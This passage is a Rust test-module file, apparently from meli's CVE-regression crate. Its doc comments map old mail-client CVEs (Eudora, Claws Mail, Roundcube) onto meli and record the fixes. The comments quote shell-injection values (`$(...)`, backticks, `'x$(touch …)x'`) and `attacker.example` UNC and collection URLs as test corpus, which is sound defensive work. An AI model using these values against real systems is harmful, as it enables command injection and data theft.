/// the `{` candidates inside the already-found line — one pass —
/// with the literal semantics (issue #27's saturating skip, the
/// honest merges) unchanged, regression-locked in
/// `melib/src/imap/protocol_parser/tests.rs::
/// test_imap_line_iterator_brace_dense_line_is_linear` together
/// with the corpus here.
#[cfg(test)]
#[path = "CVE-2007-3166.rs"]
mod cve_2007_3166;

/// CVE-2007-2770 (Eudora 7.1, Windows; no CVSS score assigned) SMTP
/// response stack-overflow regression (issue #48, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malicious SMTP server returned an overlong reply and Eudora copied
/// it into a fixed-size stack buffer — arbitrary code executed when
/// the user clicked through the raised warning. [`cve_2007_2770`]
/// maps the attack onto the issue-prescribed surface, the server
/// response reading of `melib/src/smtp.rs` (`read_lines` and both
/// handshake call sites), and drives it over a real TCP SMTP
/// handshake with the prescribed corpus family — 超长应答行 单行
/// MB 级 (terminated and unterminated), 无 CRLF 结尾 (EOF-cut and
/// pumped past the production cap), 大量多行续应答 (endless
/// `220-`/`250-` lines), plus NUL/C0/DEL/ANSI/illegal-UTF-8 payloads
/// at MB scale — at the *production* 64 MiB response cap, not the
/// 128 KiB test-build one. The literal stack-copy primitive has no
/// target in meli (safe Rust, no fixed-size response buffer, heap
/// accumulation already walled by `MAX_SERVER_RESPONSE_SIZE` and the
/// per-read timeout), and the corpus exposes one real gap, fixed
/// with this regression in `read_lines` (CWE-407, the
/// quadratic-rescan class CVE-2024-30103 closed for header values):
/// the CRLF separator search restarted from the beginning of the
/// current line after every 1 KiB read, so an unterminated reply
/// line — this CVE's primary shape — made each chunk rescan the
/// whole accumulated prefix: ≈ 2.2 TB of scanning before the 64 MiB
/// cap fired, minutes of CPU per hostile connection (the alert-hang
/// face of the 2007 advisory). The fix keeps an incremental scan
/// cursor resuming one byte early — a `\r` at the cursor may have
/// met its `\n` in the newest chunk — so the read is one forward
/// pass while a separator split across read chunks is still found
/// (regression-locked in melib's `smtp.rs` tests together with the
/// corpus here).
#[cfg(test)]
#[path = "CVE-2007-2770.rs"]
mod cve_2007_2770;

/// CVE-2004-1944 (Qualcomm Eudora 6.1 / 6.0.3 for Windows, CVSS v2
/// 5.0) nested-MIME denial-of-service regression (issue #51, table 2
/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution):
/// Paul Szabo's bugtraq PoC (BID 10137) crashed Eudora with a stack
/// overflow at 580 levels of nested `multipart/mixed` (570 was fine)
/// — a pure availability attack. [`cve_2004_1944`] locks meli's
/// equivalent surface, the multipart recursion of
/// `melib/src/email/attachments.rs`, with the verbatim generator at
/// both advisory thresholds and far past them: the C4 builder cap
/// keeps every spelling (bare-`\\n` verbatim, `CRLF` mirror,
/// shared-boundary self-similar piles, alternating subtypes,
/// thousands of levels) at a 100-level tree with the remaining
/// subtree as one opaque leaf — and exposes one real gap of the same
/// class, fixed with this regression: the reply path's recursive
/// re-parse (`Attachment::decode_rec_helper`'s inline
/// `message/rfc822` arm) recursed once per hop with no bound, each
/// hop handing `AttachmentBuilder::new` a fresh multipart budget, so
/// a mail nested ≈1700 `message/rfc822` levels deep (measured
/// pre-fix, 2 MiB stack) aborted the process the moment a reply was
/// drafted from it. The fix caps the hop recursion at
/// `MAX_RFC822_DECODE_NESTING_DEPTH` (8, matching the display path's
/// issue-#23 cap), regression-locked in
/// `melib/src/email/attachments.rs` together with the corpus here.
#[cfg(test)]
#[path = "CVE-2004-1944.rs"]
mod cve_2004_1944;

/// CVE-1999-0427 (Eudora 4.1, no CVSS score assigned; CVE candidate
/// proposed 1999-07-28) attachment-filename length denial-of-service
/// regression (issue #50, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): one
/// mail carrying an attachment with a long enough filename performed
/// a denial of service on the client — the earliest of the
/// e-mail-client 「长度即拒绝服务」 family, where the name alone was
/// the weapon. [`cve_1999_0427`] drives the issue's over-length
/// corpus class (64 KiB+ filenames, plain / multibyte / RFC 2047
/// armored / RFC 2231 segmented / legacy `Content-Type name=`
/// spellings, up to 1 MiB) through the whole length axis of the
/// surfaces a mail-controlled attachment name travels: melib parsing
/// keeps the name byte-faithful at full length with no fixed-size
/// buffer to truncate or overrun (the 📎 receive indicator with it),
/// the attachment-tree line wraps losslessly and bounded through
/// both pager line breakers, and every landing sink (save
/// components, the mailcap `%s` temp hint) caps the name on a UTF-8
/// character boundary before it touches a filesystem. The
/// end-to-end meli faces (envelope view tree render, batch save) are
/// locked in `meli/src/mail/view/tests.rs`. The result is
/// **immune, no gap found**: the walls are issue #47's pre-landing
/// component cap and issue #24's linear `phrase()`, re-locked at
/// this CVE's own pure-length corpus; no production code needed
/// changing.
#[cfg(test)]
#[path = "CVE-1999-0427.rs"]
mod cve_1999_0427;

/// CVE-2015-8708 (Claws Mail 3.13.1, no CVSS score assigned) Japanese
/// character-set conversion stack-overflow regression (issue #53,
/// table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution): a stack-based buffer overflow in `conv_euctojis`
/// (`codeconv.c`) let a crafted e-mail crash the client through the
/// EUC-JP → ISO-2022-JP re-encoding direction — the incomplete-fix
/// **bypass** of its same-month sibling CVE-2015-8614 (issue #52),
/// whose advisory covered the `conv_jistoeuc`/`conv_euctojis`/
/// `conv_sjistoeuc` triple. [`cve_2015_8708`] locks meli's immune
/// mapping layer by layer on the issue-prescribed bypass-variant
/// corpus (混合非法转义 + 多字节边界组合: escape-mid-pair interrupts,
/// half-cut designators, CS2/CS3 invocations, unknown G1/G3
/// designators, C1 garbage, claim/byte-stream mismatches, every CTE
/// wrapping and every truncation boundary): the only conversion
/// funnel `decode_charset` maps every charset to a memory-safe
/// `encoding_rs` decoder whose output never exceeds its input and
/// never panics — exact known-answer verdicts included — and the
/// overflow's own re-encode direction has no code to run in (the
/// composer emits UTF-8 only, `charset="utf-8"` and `=?UTF-8?B?…?=`,
/// never a JIS designator), locked through the RFC 2047 header
/// paths, the full CTE × claim body matrix, the exhaustive prefix
/// sweeps and a stacked kitchen-sink mail. The result is **immune,
/// no gap found**: the Shift_JIS claim's Ascii-lossy degradation is
/// documented as the mapping, not a gap of this CVE's class; no
/// production code needed changing.
#[cfg(test)]
#[path = "CVE-2015-8708.rs"]
mod cve_2015_8708;

/// CVE-2015-8614 (Claws Mail < 3.13.1, no CVSS score assigned)
/// Japanese character-set conversion stack-overflow regression
/// (issue #52, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// virus / code execution): a crafted e-mail drove Claws Mail's
/// `codeconv.c` converters (three functions around the
/// ISO-2022-JP / Shift_JIS / EUC-JP family) into multiple stack
/// buffer overflows via malformed ISO-2022-JP escape sequences and
/// half-cut Shift_JIS / EUC-JP multibyte sequences (CWE-121;
/// CVE-2015-8708 later bypassed the incomplete fix). meli's whole
/// conversion surface is one checked `encoding_rs` decoder call
/// per charset behind `decode_charset`, so
/// [`cve_2015_8614`] locks the issue-prescribed surfaces — body
/// decode, RFC 2047 encoded-word headers, `melib/src/text` display
/// layout — over the prescribed corpus (illegal escapes with
/// exhaustive escape-final/byte/pair sweeps, half-cut multibyte
/// families, MB-scale masses) as bounded, deterministic, U+FFFD-
/// replacing conversion — and exposes one real gap, fixed with
/// this regression: `Charset` had no Shift_JIS variant at all, so
/// every alias of the family (`shift_jis`, `Shift-JIS`, `sjis`,
/// `ms_kanji`, `windows-31j`, `cp932`, `x-sjis`, …) fell through
/// to the lossy ASCII default and an honestly labeled Shift_JIS
/// mail rendered as mojibake — the CVE-2015-8708 「variant bypass」
/// face. The fix maps the whole family onto `encoding_rs`'s WHATWG
/// Shift_JIS (Windows-31J) decoder in `melib/src/email/
/// attachment_types.rs` + `parser.rs`'s `decode_charset` (and the
/// mail view's force-charset selector), regression-locked in
/// `melib/src/email/parser/tests.rs::
/// test_charset_shift_jis_label_family_converts` together with the
/// corpus here.
#[cfg(test)]
#[path = "CVE-2015-8614.rs"]
mod cve_2015_8614;

/// CVE-2020-16094 (issue #55, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malicious IMAP server made Claws Mail ≤ 3.17.6 rebuild the
/// client-side directory tree from an unbounded chain of subfolders,
/// exhausting the client during the rebuild (CWE-674; CVSS 7.5).
/// [`cve_2020_16094`] maps the attack onto meli's issue-prescribed
/// surface — `melib/src/imap/protocol_parser.rs`'s
/// [`list_mailbox_result`] LIST/LSUB ingestion, the mailbox-map
/// construction it feeds (`ImapType::ingest_mailbox_list_line`), and
/// the mailbox-tree consumer in `meli/src/accounts` that is meli's
/// directory-tree equivalent — and locks it on the verbatim 「delimiter
/// 堆叠 10^5 层路径」 corpus plus the every-ancestor ladder Claws
/// Mail's rebuild consumed. Four real gaps it exposed are fixed with
/// this regression: the LIST hierarchy depth was unbounded (now
/// capped at [`MAX_MAILBOX_HIERARCHY_DEPTH`] = 20 levels with a clean
/// deterministic parse error, the 「畸形层级确定报错」 prescription);
/// `build_mailboxes_order` built the owned `MailboxNode` tree with no
/// depth limit of its own and one recursive call per hierarchy level
/// (now an explicit-stack arena rebuild that also refuses to nest
/// deeper than the cap whatever the backend feeds it — foreign
/// backends and the sqlite3 sync cache included — keeping every later
/// walk linear in the number of mailboxes, so the uncapped rebuild's
/// O(depth²) snapshot memory can no longer exhaust the system);
/// `Account::list_mailboxes` plus the tree's derive `Clone`/`Drop`
/// glue spent a frame per level on the sidebar snapshot and teardown
/// as well (now iterative, via [`flatten_mailbox_tree`] and manual
/// constant-stack `Clone`/`Drop`); and the first iterative rewrite
/// linked arena children in reversed sibling order, flipping deep
/// sidebar order and `has_sibling` bits (now pushed off the walk
/// stack in reverse so the deepest-first linking restores natural
/// order). In-crate twins: `melib/src/imap/protocol_parser/tests.rs::
/// test_imap_list_mailbox_result_hierarchy_depth_limit`.
#[cfg(test)]
#[path = "CVE-2020-16094.rs"]
mod cve_2020_16094;

/// CVE-2020-12641 (Roundcube Webmail `<= 1.4.3`, CVSS 9.8, CWE-78) OS
/// command-injection regression (issue #57, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): the
/// `im_convert_path` / `im_identify_path` configuration values were
/// concatenated into a shell command line and run through the shell,
/// so a value carrying `;`, `|`, a backtick or `$(...)` executed an
/// arbitrary command with the server's privileges. The trusted field
/// was not the problem; completing a command-string template with
/// mail-controlled text and handing it to `sh -c` was. [`cve_2020_12641`]
/// maps that exactly onto meli's mailcap handler
/// (`meli/src/mailcap.rs`): the local, trusted mailcap command field
/// may legitimately carry pipes and command substitutions, while the
/// mail-controlled `%t` content-type tag, `%{param}` MIME parameter
/// and `%s`/`%F` temporary path are spliced into it. The regression
/// exposes and locks the real gap: the old `quote_shell_word` armor
/// only protects the bare context, so a template that opened `"..."`,
/// `'...'`, a backtick or a `$(...)` region re-activated the value's
/// shell syntax (or mangled it into a syntax error). The fix
/// classifies the quoting context at each substitution point
/// (`shell_quote_context`) and encodes for that exact region, refusing
/// undecidable templates (`ShellContext::Ambiguous`) instead of
/// guessing. Locked by `cve/src/CVE-2020-12641.rs` end to end and by
/// the in-crate twins in `meli/src/mailcap.rs`
/// (`expand_args_double_quoted_context_escapes`,
/// `expand_args_single_quoted_context_reopens_quote`,
/// `expand_args_backtick_context_escapes`,
/// `expand_args_ambiguous_context_fails_closed`).
#[cfg(test)]
#[path = "CVE-2020-12641.rs"]
mod cve_2020_12641;

/// CVE-2002-1770 (Qualcomm Eudora 5.1 on Windows, no CVSS score
/// assigned) HTML-mail `file://` media-embedding script-execution
/// regression (issue #58, table 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — web/HTML embedding): an HTML
/// mail used a `t:video` tag to reference a Windows Media Player file
/// attached to the mail through a `file://` URL; Eudora handed the
/// markup to Internet Explorer, which resolved it into the
/// unsandboxed 「My Computer」 local zone and ran the WMV's embedded
/// JavaScript there. meli links no Microsoft HTML/script/media stack,
/// no Windows protocol or Local Machine zone handling, so the issue's
/// equivalent surface is the single HTML display pipeline —
/// [`sanitize`] (ammonia allowlist) followed by [`render`] (html2text
/// → plain terminal text) — and [`cve_2002_1770`] locks it as an
/// immunity proof on a full `multipart/mixed` corpus mail (text/html
/// body + `application/octet-stream` `.wmv` attachment): the
/// whitelist holds none of `object`/`embed`/`iframe`/`video`/
/// `source`/`param`/`t:video`, `file:` is not on the URL-scheme
/// allowlist (`http`/`https`/`mailto` only) for any spelling, casing
/// or quoting, so every carrier and reference dies in `sanitize`, the
/// rendered output is plain text with no file reference or executable
/// marker alive, and the media attachment stays an opaque,
/// never-materialized blob whose script never crosses into the
/// rendered text. No gap was exposed on this corpus; no production
/// code needed changing.
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
#[cfg(test)]
#[path = "CVE-2002-1770.rs"]
mod cve_2002_1770;

/// CVE-2024-37385 (Roundcube Webmail < 1.5.7, 1.6.x < 1.6.7, Windows
/// deployments only, CVSS 9.8, CWE-77) OS command-injection regression
/// (issue #56, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// virus / code execution): the ImageMagick configuration paths
/// `im_convert_path`/`im_identify_path` were completed into a shell
/// command line, and **the fix for CVE-2020-12641 (issue #57) was
/// itself incomplete** — it rejected only backslash-leading paths, so
/// the forward-slash UNC spelling `//attacker.example/share/…` (plus
/// whitespace/type-juggling) passed the check and still injected.
/// meli's equivalent surface is the CVE-2020-12641 one: the mailcap
/// `%` substitutions of `meli/src/mailcap.rs`, where mail-controlled
/// bytes (`%t` type tag, `%{param}` MIME parameters, `%s`/`%F` temp
/// paths) join the local, trusted RFC 1524 shell templates — so this
/// CVE attacks *the context-aware encoding that first fix landed*.
/// [`cve_2024_37385`] locks it layer by layer over the
/// issue-prescribed metacharacter corpus (`;`、反引号、`$()`、引号逃逸
/// from malicious attachment names, parameters and type tags): exact
/// known answers against an independent POSIX single-quoting oracle,
/// actually-spawned `sh -c` runs whose stdout must stay byte-verbatim
/// and whose canary markers must stay absent, the CVE's own Windows
/// spellings (`//server/share`, `\\server\share`, `cmd.exe /c`,
/// `%SystemRoot%`, `^&`) as inert data on meli's POSIX surface (the
/// platform-precondition immunity mapping), the scanner's equivalent
/// quoting-region spellings (`$'`, `$"`), and the 「one argv element」
/// wall. It exposes **two real gaps of the exact "incomplete-fix"
/// class this CVE memorializes, both fixed with this regression**:
/// (1) the context scanner did not track here-documents *inside*
/// `$(...)`/backtick regions, so a `%{charset}` landing in such a body
/// was classified bare and armored with `'...'` — literal characters
/// in a here-document body, whose `$()`/backticks still expanded
/// (verified against a real shell pre-fix); a `<<` inside a command
/// substitution is lexically indistinguishable from an arithmetic
/// left shift, so the fix fails closed. (2) an arithmetic `$((...))`
/// region executes command substitutions and backticks in its
/// expression text *even inside quotes* (empirically: a `'x$(touch
/// …)x'` operand still substitutes before the arithmetic parses), so
/// the bare armor a `$((` body used to get let the payload inject —
/// and `$((` is lexically indistinguishable from a command
/// substitution containing a subshell, so no armor satisfies both
/// readings and the fix fails closed there too
/// (`ShellContext::Ambiguous`, the third-`$()`-level contract), while
/// closed `$((…))` regions and nested ordinary `$(...)` bodies keep
/// their bare armor. Locked together with the production newline wall
/// (mailcap continuations are stripped; a file can never deliver the
/// multi-line here-document shape) in `meli/src/mailcap.rs` and the
/// corpus here.
#[cfg(test)]
#[path = "CVE-2024-37385.rs"]
mod cve_2024_37385;

/// CVE-2002-1210 (Qualcomm Eudora 5.1.1 / 5.2, Windows; no CVSS score
/// assigned) predictable-attachment-path + frame-based local-file-read
/// regression (issue #59, table 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding):
/// Eudora stored an attachment at a sender-predictable path, and a
/// malicious HTML mail used links/frames (`<a href="file://…">`,
/// `<iframe src="file://…">`, `<frameset><frame src=…>`) to load that
/// attachment through `file://` into the local browser context, where
/// the attachment's script could read and exfiltrate arbitrary local
/// files. meli links no browser engine, DOM, CSS/JS runtime or media
/// decoder, so the issue's three-layer equivalent surface is mapped and
/// locked by [`cve_2002_1210`]:
///
/// 1. **The rich-context half is immune by construction** — meli's only
///    HTML display pipeline is [`sanitize`] (ammonia allowlist) →
///    [`render`] (html2text → plain terminal text). The tag allowlist
///    holds no `iframe`/`frame`/`frameset`/`object`/`embed`/`script`
///    (removed with their content), the URL-scheme allowlist is only
///    `http`/`https`/`mailto` (every `file:` spelling — casing, drive
///    path, staging-dir path — is dropped), and the output is plain
///    text with no scripting engine to run the attachment script. No
///    embedding container or `file:` reference survives `sanitize`, the
///    `sanitize` output is a fixed point, and no attachment script
///    marker reaches rendered text.
/// 2. **The launch gate is immune** — even a surviving `file:` link is
///    held by the OS url-launcher gate
///    ([`is_default_launchable_scheme`] / [`url_scheme`]): `file:`
///    (any casing/spelling) is not in `DEFAULT_LAUNCHABLE_SCHEMES` and
///    needs an explicit per-URL confirmation, while an honest
///    `http://attacker.example/collect` stays launchable. Wall locked
///    by the CVE-2008-0039 corpus (issue #33).
/// 3. **The predictable-path half was a real gap** —
///    [`File::create_temp_file`] used to land a hint-bearing name
///    verbatim at `<temp_dir>/meli/<mail-controlled name>`, exactly the
///    Eudora precondition; the parallel issue-59-fix branch randomizes
///    the default landing component to
///    `stem_<32 lowercase hex UUID infix>.<ext>` and tightens the
///    `<temp_dir>/meli` staging directory to `0o700` (it used to follow
///    the process umask, usually `0o755`, letting other local users
///    list a victim's landed attachment names — this CVE's
///    information-leak face). The `temp_landing_path_is_unpredictable_and_private`
///    regression asserts that post-fix contract, so it is expected to
///    fail in this corpus-only worktree until issue-59-fix merges; the
///    remaining tests lock the two immune layers on the full
///    `multipart/mixed` corpus (HTML body with every carrier plus the
///    `eudora_leak.htm` attachment carrying the classic
///    `XMLHttpRequest` → `file://` → exfil script).
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
/// [`url_scheme`]: meli::mail::view::envelope::url_scheme
/// [`File::create_temp_file`]: meli::types::File::create_temp_file
/// [`cve_2002_1210`]: self::cve_2002_1210
#[cfg(test)]
#[path = "CVE-2002-1210.rs"]
mod cve_2002_1210;

/// CVE-2001-1326 (Qualcomm Eudora 5.1, Windows; no CVSS score assigned) HTML
/// 表单执行邮件内嵌附件 regression (issue #60, table 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding): NVD
/// 记录，HTML 邮件里的「伪装成图片链接的表单」被激活（点击看似图片 / 链接
/// 的 submit 控件）后触发表单提交，Eudora 的表单处理把 `action` 解析到邮件
/// 附件的落盘路径，从而执行邮件内嵌附件。攻击链需要四环同时成立：(1) HTML
/// 邮件由内嵌 IE 引擎渲染且 `<form>` 存活；(2) submit 控件伪装成无害图片 /
/// 链接诱导激活；(3) 表单提交处理把 `action` 解析到本地附件路径并启动；
/// (4) 附件落盘路径可预测 / 可达。meli 是终端邮件客户端，唯一 HTML 显示管线
/// 是 [`sanitize`] (ammonia allowlist) → [`render`] (html2text → 纯终端文本)，
/// 四环都没有对应功能面：`sanitize` 的元素白名单不含
/// `form`/`input`/`button`/`select`/`textarea`/`isindex` 等任何交互元素
/// （元素删除、子文本保留，void 元素连同属性整体消失）；唯一 URL 承载属性是
/// `a[href]`，方案白名单只有 `http`/`https`/`mailto`，`action`/`formaction` 随
/// 元素一起消失，`file:`/`javascript:` 无处存活；html2text 之后没有 DOM / 表单
/// 引擎，全仓库（`meli/src`）不存在任何「HTML 表单提交」处理代码（UI 的
/// `FormWidget` 是联系人 / 撰写表单，与邮件 HTML 无关）；附件保持不透明
/// blob，阅读 / 渲染不落盘不执行，打开附件走 mailcap / launcher 的确认门
/// （issue #21/#33/#57 已锁）。[`cve_2001_1326`] 以完整 `multipart/mixed`
/// 语料（伪装成图片链接的 form 正文 + 携带 MZ 头与 payload 的可执行附件）
/// 覆盖 advisory 原形、各类 submit 控件、`action` 各 scheme / 拼写 / 大小写、
/// 嵌在白名单结构里与 math/svg mXSS 近亲，并断言 sanitize 后无任何交互容器 /
/// 无 `file:` / 无附件名、预言机全过且为不动点，render 输出纯文本无
/// `form`/`submit`/`action=` 痕迹，附件解码等于原字节且从不落盘。结论：
/// 免疫证明，未发现缺口，无需改动生产代码。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2001_1326`]: self::cve_2001_1326
#[cfg(test)]
#[path = "CVE-2001-1326.rs"]
mod cve_2001_1326;

/// CVE-2002-2351（Qualcomm Eudora 5.1，Windows；NVD 未分配 CVSS 分数）
/// 附件名尾点绕过可执行附件告警 regression（issue #61，表 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding）：
/// 附件名以 `.` 结尾（`evil.exe.`）或点号堆积（`evil.exe....`）时，
/// Eudora 的「可执行附件安全告警」被绕过——Win32 文件创建 API 会剥离
/// 最终路径组件的尾部点号 / 空格，文件实际落盘为 `evil.exe`，而告警
/// 检查看到的是带尾点的 `evil.exe.`，把扩展名判定为空 / 非 exe，检查与
/// 落盘不一致（check/use divergence）。
///
/// meli 等价面与结论：meli 全仓库（`meli/src`）没有「可执行附件告警」
/// 功能面，本 CVE 的字面「绕过告警」没有可绕过的对象；真正对应的是
/// **邮件控制附件名的落盘汇**——`File::create_temp_file`（mailcap `%s`、
/// open-with 默认应用、envelope.rs 临时落盘）与
/// [`sanitize_filename_component`] + [`unique_filename_component`]（单 /
/// 批量保存、`eml_filename`）。本次发现真实缺口：
/// [`sanitize_filename`] 原先不剥离尾部点号，`evil.exe.` 会原样带着尾点
/// 进入所有落盘汇；在按 Win32 语义归一化的文件系统（WSL `/mnt/c`
/// drvfs、Samba、部分 FUSE）上 OS 会创建为 `evil.exe`，check/use
/// divergence 原样重演。修复：管线末尾追加尾点剥离
/// （`meli/src/types/helpers.rs` 的 `strip_trailing_dots`），并让 192 字节
/// 截断后复剥一次，避免字节上限重新引入尾点；只剥尾点，中缀点号堆积
/// （CVE-2003-0376 契约）与前导点保留，全点名归一为 `""` 走生成名回退。
/// [`cve_2002_2351`] 以内嵌 `multipart/mixed` 语料逐层锁定：wire 真实性
/// （melib 逐字返回尾点名）、规范化剥离表、临时落盘（无尾点、`.exe`
/// 扩展名可见、`<tmp>/meli/`、`0o600` 无执行位、UUID 中缀随机）、孪生
/// 去重（`evil.exe` / `evil.exe.` 不碰撞不丢）、以及免疫映射（`MZ` 头
/// 可执行内容解析 / 显示不物化临时文件；打开附件是 `open_mailcap` +
/// `cmd_buf` 门控的用户显式动作；mailcap shell 上下文编码由 issue
/// #57/#56 锁定）。结论：一个真实缺口，已随本回归修复，生产代码改动
/// 仅限 `meli/src/types/helpers.rs`。
///
/// [`sanitize_filename`]: meli::types::sanitize_filename
/// [`sanitize_filename_component`]: meli::types::sanitize_filename_component
/// [`unique_filename_component`]: meli::types::unique_filename_component
/// [`cve_2002_2351`]: self::cve_2002_2351
#[cfg(test)]
#[path = "CVE-2002-2351.rs"]
mod cve_2002_2351;

/// CVE-2003-0336（Qualcomm Eudora 5.2.1，Windows；NVD 未分配 CVSS 分数）
/// 伪造 `Attachment Converted:` 标记裸 `CR` 注入 / 任意文件读取 regression
/// （issue #62，表 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution family，任意文件读取面）：Eudora 在把 MIME 附件转存为本地
/// 文件后会向邮箱写一行 `Attachment Converted<CR>: "C:\path"` 元数据；其
/// 邮箱解析把裸 `CR`（回车 0x0D）当行终止符（mbox / 老式 Mac 行尾语义），
/// 于是攻击者在邮件里注入同样字节串时，伪造标记会被当成独立的头 / mbox
/// 元数据行，Eudora 随后把引号里的任意本地路径当「已转换附件」读取——任意
/// 文件读取；也可用 `Attachment Converted<CR>:` 名内 CR 拼写绕过只按 `\n`
/// 切分的检查（Paul Szabo 2003-05 bugtraq 系列，与同族 CVE-2003-0376 的
/// [`cve_2003_0376`] 同一份报告）。
///
/// meli 等价面与结论：meli 全仓库没有 Eudora 的 `Attachment Converted`
/// 转换步骤，也没有「邮箱元数据行 → 本地附件路径」这一层；`header_value()`
/// 只在 `LF`/`CRLF` 结束头值，裸 `CR` 留在头值内部，绝不切分新头，名内
/// CR 拼写被 `is_ctl_or_space!` 确定性拒绝；头值进 `Envelope` 时 `phrase`
/// 把中间 CR 折叠为单空格、首尾剥离，地址显示名另有 `sanitize_display_name`
/// 剥 C0，附件落盘名经 [`sanitize_filename_component`]。本次发现真实缺口：
/// `Envelope::set_message_id` 的 `msg_id` 语法失败回退分支
/// `MessageID::new(String::from_utf8_lossy(new_val))` 原样保留裸 `CR`，
/// 攻击邮件 `Message-ID: <a@b<CR>c>` 让结构字段 `message_id` 存入裸 CR，
/// `Draft::new_reply` 再把它原样写进回复的 `In-Reply-To` / `References`，
/// `finalise()` 的 CWE-93 chokepoint 因此永远拒绝发送——邮件控制的裸 CR
/// 是全部代码里唯一存活进外发头值生产者的点，与 Eudora 把裸 CR 当行终止
/// 符的根因同族（fail-closed 可用性破坏）。修复：`MessageID::new`
/// （`melib/src/email/address.rs`）在存储边界剥离 `CR`/`LF`，参照同文件
/// `sanitize_display_name` 的清洗先例；语法合法 `msg-id` 不含 CR/LF，正常
/// 路径逐字节不变。孪生单测
/// `melib/src/email/parser/tests.rs::test_email_envelope_message_id_strips_cr`。
/// [`cve_2003_0336`] 以内嵌攻击语料逐层锁定：L1 语法墙（名内 CR 确定性
/// 失败、CR 切分注入绝不诞生新头、裸 CR 行块只塌缩成一个头）、L2 无路径
/// 语义（正文位标记惰性、不派生附件 / 文件名、`<tmp>/meli` 不变、显示为
/// 折叠纯文本）、L3 外发墙与缺口回归（修复后回复头无 CR 且 `finalise` 为
/// `Ok`，手工含 CR 头值仍被拒绝）、L4 附件名面（wire 逐字保真，展示 /
/// 落盘组件剥控制字符且为单一组件）。
///
/// [`cve_2003_0376`]: self::cve_2003_0376
/// [`cve_2003_0336`]: self::cve_2003_0336
/// [`sanitize_filename_component`]: meli::types::sanitize_filename_component
#[cfg(test)]
#[path = "CVE-2003-0336.rs"]
mod cve_2003_0336;

/// CVE-2001-0677（Qualcomm Eudora 5.0.2，Windows；NVD 未分配 CVSS 分数）
/// `Attachment Converted` 头转发泄露本地文件 regression（issue #63，表 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding）：Eudora
/// 转存 MIME 附件后会写一行携带目标本地路径的 `Attachment Converted` 元数据
/// 头（如 `"C:\path\secret.txt"`）；用户转发这样一封邮件时，Eudora 读取该头
/// 指向的本地文件并作为附件重新附上发出——用户转发即把本地文件回传给攻击者。
/// meli 没有 Eudora 的 `Attachment Converted` 转存面，唯一 HTML 无关的转发
/// 管线 `Composer::forward`（`meli/src/mail/compose.rs:604`）只搬运邮件自身
/// 字节：`inline` 模式附 `env.body_bytes(bytes)`，`as_attachment` 模式把整封
/// `bytes` 打成 `message/rfc822`、文件名取
/// `eml_filename(env.message_id())`。全仓库唯一的「读本地文件成附件」生产函数
/// `melib/src/email/compose.rs::attachment_from_file` 的调用点全部是用户显式
/// 的附件选择 / 添加附件动作，没有任何从收到的邮件字节推导路径的调用。
/// [`cve_2001_0677`] 以内嵌 `multipart/mixed` 语料逐层锁定为**免疫证明，未
/// 发现缺口，无需改动生产代码**：L1 头拼写变体 / 正文位标记只是
/// `other_headers` 惰性字符串，不派生附件 / 文件名、`<tmp>/meli` 不变；L2
/// 用真实 canary 文件证明转发两种模式都不读取、不附带、不改动头字段指向的
/// 文件，附件字节逐字节等于原邮件自身字节；L3 转发草稿头集合固定，伪造头不
/// 再生（`as_attachment` 中只存在于嵌套 `message/rfc822` 的惰性原始字节里）。
///
/// [`cve_2001_0677`]: self::cve_2001_0677
#[cfg(test)]
#[path = "CVE-2001-0677.rs"]
mod cve_2001_0677;

/// CVE-1999-1016（Microsoft HTML 控件 / IE5 / Outlook Express 5 / Eudora
/// 4.x–5.x；NVD 未分配 CVSS 分数）HTML 表单资源耗尽 / 拒绝服务 regression
/// （issue #64，表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 /
/// web/HTML embedding）：一封 HTML 邮件把巨型表单字段（`<input type=text
/// value="A…">` MB 级 value、`<textarea>`/`<select>`/`<button>` 巨型内容）
/// 放进 `<table><tr><td>` 单元格；内嵌 MS HTML 控件在打开邮件时为这些字段
/// 建立布局，海量内容让渲染线程跑到 100% CPU、客户端卡死（CWE-400 /
/// CWE-770，开放邮件即触发的可用性攻击）。
///
/// meli 等价面与结论：唯一 HTML 显示管线是 [`sanitize`]（ammonia 白名单）→
/// [`render`]（html2text → 纯终端文本）。**字面触发面免疫**：`input`/
/// `textarea`/`select`/`button`/`form` 都不在元素白名单里，也不在
/// `clean_content_tags`（只有 `script`/`style`），ammonia 按「元素删除」处理
/// ——void 元素 `input` 连同 `value=` 属性整体消失，`textarea`/`select`/
/// `button` 只留子文本，advisory 的巨型字段到不了渲染器。**两个真实缺口，
/// 均已随本回归修复**：
///
/// 1. **CWE-400 输入无上限**：[`render`] 原先对输入大小没有任何上限，>10 MiB
///    的 HTML 邮件（base64 在 wire 上膨胀 ~33%）会在打开邮件时、在阻塞
///    view job 线程上耗尽与输入成正比的 CPU / 内存（release 实测：10 MiB
///    纯嵌套表格 ≈ 3.3 s 最坏形态、10 万个小表 3.7 MB ≈ 790 ms、16 MiB
///    单格 ≈ 276 ms；100 MiB HTML 邮件 ≈ 33 s 100% CPU + ~1 GB 分配）。
///    修复：新增 [`MAX_HTML_RENDER_INPUT_BYTES`]（10 MiB），`render()` 在
